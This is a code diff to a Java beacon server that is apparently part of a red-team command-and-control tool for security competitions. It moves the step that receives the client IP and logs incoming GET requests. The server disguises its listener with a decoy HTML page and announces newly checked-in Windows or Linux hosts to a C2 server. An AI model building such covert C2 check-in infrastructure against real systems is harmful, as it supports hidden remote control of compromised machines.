@@ -312,20 +312,21 @@ public class BeaconServer implements Runnable{
                 String firstMessage = duplexer.receive();
                 String OSMessage = "";
                 if(firstMessage.equals("GET / HTTP/1.1")){
+                    System.out.println("Received get request");
                     duplexer.send("<!DOCTYPE html>\r\n<html>\r\n<head>\r\n<title>My First HTML Page</title>\r\n</head>\r\n<body>\r\n<h1>Welcome to My Website</h1>\r\n</body>\r\n</html>\r\n");
                 } else {
                     OSMessage = firstMessage;
                 }
                 System.out.println("Inital Message: " + OSMessage);
 
-                // Second Message is from the client to the server, the IP address of the client.
-                // The Client sends it's own IP Address, so that all of the IP addresses are not viewed as NAT'd ip addresses
-                // In competitions the private IP addresses have a lot of meaning, typically they will follow some format 
-                // 10.a.b.c, where a = team number, b = OS (1 = Windows, 2 = Linux), and c will be the specific host
-                String IPAddress = duplexer.receive();
-                System.out.println("IP Address: " + IPAddress);
-
                 if(!(OSMessage.isEmpty())){
+                    // Second Message is from the client to the server, the IP address of the client.
+                    // The Client sends it's own IP Address, so that all of the IP addresses are not viewed as NAT'd ip addresses
+                    // In competitions the private IP addresses have a lot of meaning, typically they will follow some format 
+                    // 10.a.b.c, where a = team number, b = OS (1 = Windows, 2 = Linux), and c will be the specific host
+                    String IPAddress = duplexer.receive();
+                    System.out.println("IP Address: " + IPAddress);
+
                     if(OSMessage.equals("Windows") || OSMessage.equals("Linux")){
                         // Send message to C2 announcing that a new client has been obtained
                         C2Handler.sendDataToC2Server("New " + OSMessage + " Client at " + IPAddress);
